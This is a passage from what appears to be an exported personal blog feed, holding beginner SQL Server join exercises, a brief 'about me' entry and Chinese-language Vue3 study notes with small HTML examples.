	BOOKDate <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>
	TypeID <span class="token keyword">int</span> <span class="token keyword">foreign</span> <span class="token keyword">key</span> <span class="token keyword">references</span> booktype<span class="token punctuation">(</span>TypeID<span class="token punctuation">)</span>
<span class="token punctuation">)</span>
<span class="token keyword">insert</span> <span class="token keyword">into</span> booktype <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'古典'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'现代'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'科幻'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'言情'</span><span class="token punctuation">)</span>
<span class="token keyword">insert</span> <span class="token keyword">into</span> book <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'三国演义'</span><span class="token punctuation">,</span><span class="token string">'王森'</span><span class="token punctuation">,</span><span class="token string">'2016-9-8'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'校花的世界'</span><span class="token punctuation">,</span><span class="token string">'赵兵'</span><span class="token punctuation">,</span><span class="token string">'2016-8-6'</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'钢铁侠'</span><span class="token punctuation">,</span><span class="token string">'崔辉'</span><span class="token punctuation">,</span><span class="token string">'2016-8-6'</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'c#'</span><span class="token punctuation">,</span><span class="token string">'冯强'</span><span class="token punctuation">,</span><span class="token string">'2016-8-6'</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--所有图书编号，名称，作者及类别名称</span>
<span class="token keyword">select</span> bookid<span class="token punctuation">,</span>bookname<span class="token punctuation">,</span>bookauthor<span class="token punctuation">,</span>typename <span class="token keyword">from</span> booktype <span class="token keyword">inner</span> <span class="token keyword">join</span> book <span class="token keyword">on</span> book<span class="token punctuation">.</span>typeID <span class="token operator">=</span> booktype<span class="token punctuation">.</span>typeID
<span class="token keyword">select</span> bookid<span class="token punctuation">,</span>bookname<span class="token punctuation">,</span>bookauthor<span class="token punctuation">,</span>typename <span class="token keyword">from</span> booktype<span class="token punctuation">,</span>book <span class="token keyword">where</span> book<span class="token punctuation">.</span>typeID <span class="token operator">=</span> booktype<span class="token punctuation">.</span>typeID
<span class="token comment">--查询古典及教育类图书的编号，名称，作者，出版日期及类别名称</span>
<span class="token keyword">select</span> bookid<span class="token punctuation">,</span>bookname<span class="token punctuation">,</span>bookauthor<span class="token punctuation">,</span>bookdate<span class="token punctuation">,</span>typename <span class="token keyword">from</span> booktype<span class="token punctuation">,</span>book <span class="token keyword">where</span> book<span class="token punctuation">.</span>TypeID <span class="token operator">=</span> booktype<span class="token punctuation">.</span>TypeID <span class="token operator">and</span> TypeName <span class="token operator">=</span> <span class="token string">'古典'</span> <span class="token operator">or</span> TypeName <span class="token operator">=</span> <span class="token string">'现代'</span>
<span class="token comment">--查询图书信息按出版日期降序</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> book <span class="token keyword">order</span> <span class="token keyword">by</span> BOOKDate <span class="token keyword">desc</span>
<span class="token comment">--查询作者姓王的所有图书名称，作者及类别名称</span>
<span class="token keyword">select</span> bookname<span class="token punctuation">,</span>bookauthor<span class="token punctuation">,</span>typename <span class="token keyword">from</span> booktype<span class="token punctuation">,</span>book <span class="token keyword">where</span> book<span class="token punctuation">.</span>TypeID <span class="token operator">=</span> booktype<span class="token punctuation">.</span>TypeID <span class="token operator">and</span> bookauthor <span class="token operator">like</span> <span class="token string">'王%'</span>
<span class="token comment">--查询图书信息表中按编号降序排序前3条数据</span>
<span class="token keyword">select</span> <span class="token keyword">top</span> <span class="token number">3</span> <span class="token operator">*</span> <span class="token keyword">from</span> book <span class="token keyword">order</span> <span class="token keyword">by</span> BOOKID <span class="token keyword">desc</span>
<span class="token comment">--分别查询每类图书的数量</span>
<span class="token keyword">select</span> booktype<span class="token punctuation">.</span>TypeID <span class="token punctuation">,</span>typename <span class="token keyword">as</span> 类型<span class="token punctuation">,</span><span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">as</span> 数量 <span class="token keyword">from</span> booktype<span class="token punctuation">,</span>book <span class="token keyword">where</span> book<span class="token punctuation">.</span>TypeID <span class="token operator">=</span> booktype<span class="token punctuation">.</span>TypeID <span class="token keyword">group</span> <span class="token keyword">by</span> booktype<span class="token punctuation">.</span>TypeID<span class="token punctuation">,</span>typename
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="自连接"><a href="#自连接" class="headerlink" title="自连接"></a>自连接</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--查看同名用户信息</span>
<span class="token keyword">select</span> a<span class="token punctuation">.</span>CourseId<span class="token punctuation">,</span>a<span class="token punctuation">.</span>Customer_Age<span class="token punctuation">,</span>a<span class="token punctuation">.</span>Customer_Name <span class="token keyword">from</span> Customer_Infor a<span class="token punctuation">,</span>Customer_Infor b <span class="token keyword">where</span> a<span class="token punctuation">.</span>Customer_Name <span class="token operator">=</span> b<span class="token punctuation">.</span>Customer_Name <span class="token operator">and</span> a<span class="token punctuation">.</span>Customer_Id <span class="token operator">&lt;></span> b<span class="token punctuation">.</span>Customer_Id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">create</span> <span class="token keyword">table</span> employee
<span class="token punctuation">(</span>
	eid <span class="token keyword">int</span> <span class="token keyword">primary</span> <span class="token keyword">key</span> <span class="token punctuation">,</span> <span class="token comment">--员工id</span>
	ename <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span> <span class="token comment">--员工姓名</span>
	mid <span class="token keyword">int</span> <span class="token operator">not</span> <span class="token boolean">null</span> <span class="token comment">--员工领导id</span>
<span class="token punctuation">)</span>
<span class="token keyword">insert</span> <span class="token keyword">into</span> employee <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'郭经理'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'小李'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--员工及领导姓名</span>
<span class="token keyword">select</span> a<span class="token punctuation">.</span>ename <span class="token keyword">as</span> 员工姓名<span class="token punctuation">,</span> b<span class="token punctuation">.</span>ename <span class="token keyword">as</span> 领导姓名 <span class="token keyword">from</span> employee a<span class="token punctuation">,</span>employee b <span class="token keyword">where</span> a<span class="token punctuation">.</span>mid <span class="token operator">=</span> b<span class="token punctuation">.</span>eid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

]]></content>
      <tags>
        <tag>database</tag>
      </tags>
  </entry>
  <entry>
    <title>about me</title>
    <url>/2023/04/18/about-me/</url>
    <content><![CDATA[<h1 id="Work-and-rest"><a href="#Work-and-rest" class="headerlink" title="Work and rest"></a>Work and rest</h1><ul>
<li>5:30 wake up</li>
<li>22:00 sleep</li>
</ul>
<h1 id="Perseverance-prevails"><a href="#Perseverance-prevails" class="headerlink" title="Perseverance prevails"></a>Perseverance prevails</h1><ul>
<li>Keep moving</li>
<li>Persist in reading</li>
<li>Continuous learning</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>temp</title>
    <url>/2023/03/27/temp/</url>
    <content><![CDATA[<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 跨数据库复制表</span>
<span class="token comment">-- 当表目标表存在时：</span>
<span class="token keyword">insert</span> <span class="token keyword">into</span> 目的数据库<span class="token punctuation">.</span><span class="token punctuation">.</span>表 <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> 源数据库<span class="token punctuation">.</span><span class="token punctuation">.</span>表
<span class="token comment">-- 当目标表不存在时：</span>
<span class="token comment">-- select * into 目的数据库..表 from 源数据库..表</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">into</span> Chips<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>getnumberid <span class="token keyword">from</span> <span class="token punctuation">[</span><span class="token keyword">user</span><span class="token punctuation">]</span><span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>getnumberid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
  </entry>
  <entry>
    <title>Vue3学习笔记</title>
    <url>/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="Vue3简介"><a href="#Vue3简介" class="headerlink" title="Vue3简介"></a>Vue3简介</h1><p>官网：<a href="http://v3.cn.vuejs.org/">http://v3.cn.vuejs.org</a></p>
<p>Vue前端的渐进式JavaScript框架。用来构建前后端动态交互的技术。从底层向上进行兼容。Vue只关注视图的数据展示，类库健全，实现单页面开发。</p>
<ul>
<li>JS、HTML、CSS</li>
<li>Vue框架能虚拟化DOM元素</li>
</ul>
<pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;title&gt;&lt;&#x2F;title&gt;
		&lt;!-- 引入最新Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;div id&#x3D;&quot;app&quot;&gt;
			&lt;!-- 渲染数据 --&gt;
			
		&lt;&#x2F;div&gt;
		
		&lt;script&gt;
			const app &#x3D; &#123;
			&#x2F;&#x2F; 初始化数据
				data()&#123;
					return&#123;
						
					&#125;
				&#125;
			&#125;;
			
			&#x2F;&#x2F; 挂载
			Vue.createApp(app).mount(&quot;#app&quot;); 
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="Vue3安装"><a href="#Vue3安装" class="headerlink" title="Vue3安装"></a>Vue3安装</h1><h2 id="1-开发平台"><a href="#1-开发平台" class="headerlink" title="1 开发平台"></a>1 开发平台</h2><ol>
<li><p>HBuidlerX：基于Vue框架的uniapp框架。</p>
</li>
<li><p>VSCode：微软开源。</p>
</li>
</ol>
<h2 id="2-安装Vue3"><a href="#2-安装Vue3" class="headerlink" title="2 安装Vue3"></a>2 安装Vue3</h2><ol>
<li>第一种：CDN引入</li>
<li>第二种：本地引入。</li>
</ol>
<pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;title&gt;Vue3安装&lt;&#x2F;title&gt;
		&lt;!-- 1.CDN:通过在线引入vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
		&lt;!-- 2.下载：通过本地引入Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;.&#x2F;js&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="Vue3的语法"><a href="#Vue3的语法" class="headerlink" title="Vue3的语法"></a>Vue3的语法</h1><h2 id="1-Vue3开发步骤及语法解析"><a href="#1-Vue3开发步骤及语法解析" class="headerlink" title="1 Vue3开发步骤及语法解析"></a>1 Vue3开发步骤及语法解析</h2><p><strong>Vue3入门案例</strong></p>
<pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!-- 
Vue3开发步骤：
	1. 创建一个Vue的实例对象：
	
	2. Vue作用在页面的指定位置(表示可以渲染页面的哪个位置);
	
	3. 数据的渲染：如何实现数据渲染到页面的指定位置处（Vue语法）
 --&gt;
 &lt;!-- 
Vue语法解析：
	1. &#123;&#123;变量名&#125;&#125;: 插值表达式，能够读取在Vue中定义的初始化变量的取值。
	2. mount(&quot;选择器&quot;): 根据选择器来选择一个元素，是Vue的挂载点，可以在该元素中使用Vue（比如访问Vue中的数据）。
	   * id选择器：mount(&quot;#id属性的值&quot;)，首选
	   * 类选择器：mount(&quot;.class属性的值&quot;)
  --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;title&gt;入门案例&lt;&#x2F;title&gt;
		&lt;!-- 引入最新Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;div id&#x3D;&quot;hello-vue&quot;&gt;
			&lt;!-- 3.渲染数据: 通过&#123;&#123;变量名&#125;&#125;访问vue中的数据 --&gt;
			&#123;&#123; message &#125;&#125;
		&lt;&#x2F;div&gt;
		
		&lt;script&gt;
			&#x2F;&#x2F; 1.初始化数据： 告知Vue对象渲染的数据是什么
			const helloVueApp &#x3D; &#123;
				data()&#123;
					&#x2F;&#x2F; 声明一个data函数：表示Vue初始化数据的声明
					return&#123;
						&#x2F;&#x2F; 声明数据
						&#x2F;&#x2F; 将初始化的数据返回给调用者
						&#x2F;&#x2F; 定义初始化的数据。变量名：变量值
						&#x2F;&#x2F; username: &quot;luotao&quot;,
						&#x2F;&#x2F; password: &quot;888&quot;,
						&#x2F;&#x2F; age: 22,
						message: &quot;hello vue&quot;,
					&#125;
				&#125;
			&#125;
			
			&#x2F;&#x2F; 2.创建一个Vue实例对象,加载初始化数据,并将Vue对象作用到页面的指定位置处（挂载）
			Vue.createApp(helloVueApp).mount(&quot;#hello-vue&quot;); &#x2F;&#x2F;选择器：选择挂载的位置，选中某一个元素。挂载到页面的指定元素上，就可以在元素内部访问vue中的数据
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230413100452819.png" alt="image-20230413100452819"></p>
<h2 id="2-data函数"><a href="#2-data函数" class="headerlink" title="2 data函数"></a>2 data函数</h2><p><strong>02-data函数</strong></p>
<pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!-- 
	data用来定义vue的初始化数据。底层返回一个$data属性，来存储data函数的内容。访问Vue实例中定义的任意变量，一般简写($data)。
 --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;title&gt;data函数&lt;&#x2F;title&gt;
		&lt;!-- 引入最新Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;div id&#x3D;&quot;app&quot;&gt;
			&lt;!-- 访问vue中的数据 --&gt;
			&#123;&#123; count &#125;&#125;
		&lt;&#x2F;div&gt;
		&lt;script&gt;
			const app &#x3D; Vue.createApp(&#123;
				data()&#123;
					&#x2F;&#x2F; data函数在vue创建组件的时候被自动调用
					return&#123;
						count: 4 
					&#125;
				&#125;
			&#125;)
			
			&#x2F;&#x2F; 返回vue的挂载实例对象
			const vm &#x3D; app.mount(&quot;#app&quot;) &#x2F;&#x2F;挂载
			
			&#x2F;&#x2F; 通过$data访问data()函数中的数据,也可以直接访问
			&#x2F;&#x2F; document表示页面对象
			&#x2F;&#x2F; write函数表示向document中追加数据
			document.write(vm.$data.count) &#x2F;&#x2F;4
			document.write(&quot;&lt;br&#x2F;&gt;&quot;) &#x2F;&#x2F; 换行
			document.write((vm.count)) &#x2F;&#x2F;4
			vm.count &#x3D; 5
			document.write(&quot;&lt;br&#x2F;&gt;&quot;) &#x2F;&#x2F; 换行
			document.write(vm.$data.count) &#x2F;&#x2F;5
			document.write(&quot;&lt;br&#x2F;&gt;&quot;) &#x2F;&#x2F; 换行
			document.write((vm.count)) &#x2F;&#x2F;5
			
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230413100536169.png" alt="image-20230413100536169"></p>
<h2 id="3-自定义函数"><a href="#3-自定义函数" class="headerlink" title="3 自定义函数"></a>3 自定义函数</h2><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!-- 
自定义函数：
	根据业务来编写逻辑，把逻辑封装到自定义的结构中，这个结构就称之为方法或函数。
	methods: 表示声明自定义函数结构，在这个结构中定义多个方法。
	&#123;
	    data()&#123;
	        return&#123;
	            &#x2F;&#x2F; 返回给调用者初始化数据
	        &#125;
	    &#125;,
	    methods:&#123;
	        &#x2F;&#x2F; 自定义函数
	        方法1(参数列表)&#123;
	            &#x2F;&#x2F;方法体
	        &#125;,
	        方法2(参数列表)&#123;
	            &#x2F;&#x2F;方法体
	        &#125;
	    &#125;
	&#125;;
 --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;title&gt;方法&lt;&#x2F;title&gt;
		&lt;!-- 引入最新Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;div id&#x3D;&quot;app&quot;&gt;
			
		&lt;&#x2F;div&gt;
		
		&lt;script&gt;
			&#x2F;&#x2F; 创建Vue实例对象并初始化数据
			const app &#x3D; Vue.createApp(&#123;
				data()&#123;
					return&#123;
						&#x2F;&#x2F; 返回给调用者初始化数据
						count: 1
					&#125;
				&#125;,
				methods:&#123;
					&#x2F;&#x2F; 自定义函数
					increment()&#123;
						&#x2F;&#x2F; this表示vue的当前实例对象,要访问data的局部变量必须通过this
						this.count++;
					&#125;,
				&#125;
			&#125;);
			&#x2F;&#x2F; 借用Vue的实例对象访问Vue中的结构 
			const vm &#x3D; app.mount(&quot;#app&quot;);
			&#x2F;&#x2F; 访问变量
			document.write(vm.count) &#x2F;&#x2F; 1
			&#x2F;&#x2F; 访问方法
			vm.increment(); &#x2F;&#x2F; count++
			document.write(vm.count) &#x2F;&#x2F; 2
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="Vue3模板语法"><a href="#Vue3模板语法" class="headerlink" title="Vue3模板语法"></a>Vue3模板语法</h1><p>允许开发者使用DOM绑定的形式做Vue数据的展示(渲染)</p>
<h2 id="1-插值、v-html指令"><a href="#1-插值、v-html指令" class="headerlink" title="1 插值、v-html指令"></a>1 插值、v-html指令</h2><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!-- v-html指令
	文本插值与HTML插值
 --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;title&gt;html指令&lt;&#x2F;title&gt;
		&lt;!-- 引入最新Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;div id&#x3D;&quot;app&quot;&gt;
			&lt;!-- 文本插值：将值作为字符串输出 
				在Vue实例对象中定义属性,然后再挂载在区域内通过&#123;&#123;变量名&#125;&#125;
			--&gt;
			&lt;p&gt;&#123;&#123;rawHtml&#125;&#125;&lt;&#x2F;p&gt; 
			&lt;!-- HTML插值: 使用v-html指令(Vue提供的)
				将指定的html片断插入到被标记的元素内,以子标签的形式出现; v-html的取值是html片断的变量名称。
			 --&gt;
			&lt;p&gt;
				&lt;span v-html&#x3D;&quot;rawHtml&quot;&gt;&lt;&#x2F;span&gt;
			&lt;&#x2F;p&gt;
		&lt;&#x2F;div&gt;
		&lt;script&gt;
			const app &#x3D; Vue.createApp(&#123;
				data()&#123;
					return&#123;
						rawHtml: &#39;&lt;span style&#x3D;&quot;color:red;&quot;&gt;这是要插入的html片断代码&lt;&#x2F;span&gt;&#39;
					&#125;
				&#125;
			&#125;);
			app.mount(&quot;#app&quot;)
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230412143356159.png" alt="image-20230412143356159"></p>
<h2 id="2-表达式"><a href="#2-表达式" class="headerlink" title="2 表达式"></a>2 表达式</h2><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!--表达式: 
	在Vue中插值支持四则运算; 将运算的结果插入到指定的位置 
	
 --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;title&gt;表达式&lt;&#x2F;title&gt;
		&lt;!-- 引入最新Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;div id&#x3D; &quot;app&quot;&gt;
			1.四则运算: &#123;&#123;5+5&#125;&#125; &lt;br&#x2F;&gt;
			2.三目运算符:  &#123;&#123; ok ? &quot;yes&quot; : &quot;no&quot; &#125;&#125; &lt;br&#x2F;&gt;
			&lt;!-- 将字符串拆分反转然后重新连接 --&gt;
			3.支持函数: &#123;&#123; message.split(&#39;&#39;).reverse().join(&#39;&#39;)&#125;&#125; &lt;br&#x2F;&gt;
			4.属性: v-bind 表示将目标属性设置为动态取值,表示将属性的值绑定到指定的一个变量中
			&lt;div v-bind:id&#x3D;&quot;&#39;list-&#39; + id&quot;&gt;&lt;&#x2F;div&gt;
		&lt;&#x2F;div&gt;
		&lt;script&gt;
			const app&#x3D;&#123;
				data()&#123;
					return&#123;
						ok: true,
						message: &quot;罗涛学习Vue3&quot;,
						id: 1
					&#125;
				&#125;
			&#125;;
			Vue.createApp(app).mount(&quot;#app&quot;);
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230412155425266.png" alt="image-20230412155425266"></p>
<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230413100853394.png" alt="image-20230413100853394"></p>
<h1 id="Vue3指令"><a href="#Vue3指令" class="headerlink" title="Vue3指令"></a>Vue3指令</h1><h2 id="1-条件指令-v-if、v-else、v-else-if、v-show"><a href="#1-条件指令-v-if、v-else、v-else-if、v-show" class="headerlink" title="1 条件指令 v-if、v-else、v-else-if、v-show"></a>1 条件指令 v-if、v-else、v-else-if、v-show</h2><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!--Vue3指令： 控制Vue的语法值的访问，应用到Dom上。
	v-if指令: 
		&lt;span v-if&#x3D;&quot;条件&quot;&gt;内容&lt;&#x2F;span&gt;
		若条件为真，则渲染到DOM上
		若条件为假，则在DOM是不进行渲染(而非隐藏)
 --&gt;
 
 &lt;!-- v-else指令
 	和v-if成对出现,当v-if指令的条件不成立,v-else被执行。
 	&lt;span v-else&gt;内容&lt;&#x2F;span&gt;
  --&gt;
  
&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
		&lt;title&gt;常用指令&lt;&#x2F;title&gt;
		&lt;!-- 引入最新Vue3脚本 --&gt;
		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
	&lt;&#x2F;head&gt;
	&lt;body&gt;
		&lt;div id&#x3D;&quot;app&quot;&gt;
			&lt;!-- seen&#x3D;true时渲染到Dom上，false则不渲染 --&gt;
			&lt;p v-if&#x3D;&quot;seen&quot;&gt;可以看见!&lt;&#x2F;p&gt;
			&lt;p v-else&gt;不可以看见!&lt;&#x2F;p&gt;
		&lt;&#x2F;div&gt;
		&lt;script&gt;
			const app &#x3D; &#123;
				data()&#123;
					return&#123;
						seen: true
						&#x2F;&#x2F;seen: false
					&#125;
				&#125;
			&#125;;
			Vue.createApp(app).mount(&quot;#app&quot;);
		&lt;&#x2F;script&gt;
	&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230413100942875.png" alt="image-20230413100942875"></p>
<pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!-- 
	条件指令 v-if 、v-else if、v-else
	如果条件不成立，则对应的标签不会被渲染到DOM上。
